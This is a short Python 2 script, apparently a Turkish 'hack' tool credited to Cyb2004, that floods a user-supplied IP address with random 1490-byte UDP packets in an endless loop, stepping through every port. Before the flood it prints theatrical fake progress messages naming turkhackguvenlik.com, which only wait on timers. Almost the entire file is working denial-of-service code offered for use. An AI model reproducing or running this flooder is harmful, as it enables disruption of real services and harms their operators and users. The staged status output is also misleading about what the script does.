import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Cyb2004")
print
print "Kodlama   : Cyb2004"
print "YouTube : Cyb2004"
print "github   : https://github.com/ThgCyb"
print "Facebook : https://www.facebook.com/BySusmaz"
print
ip = raw_input("IP Veya URL : ")
port = input("IP Port Veya URL Port       : ")

os.system("clear")
os.system("figlet Saldiri Basliyor... ")
print "[ www.turkhackguvenlik.com Baglaniyor...] 0% "
time.sleep(5)
print "[www.turkhackguvenlik.com Basariyla Baglandi...] 1%"
time.sleep(5)
print "[www.turkhackguvenlik.com Saldiri Basladi...] 50%"
time.sleep(5)
print "[www.turkhackguvenlik.com Site Bilgileri Cekiliyor...] 75%"
time.sleep(5)
print "[www.turkhackguvenlik.com Siteye Basariyla Sizi...] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Saldiri Sayisi %s Paket Atiliyor.. %s Gizli Portlar:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

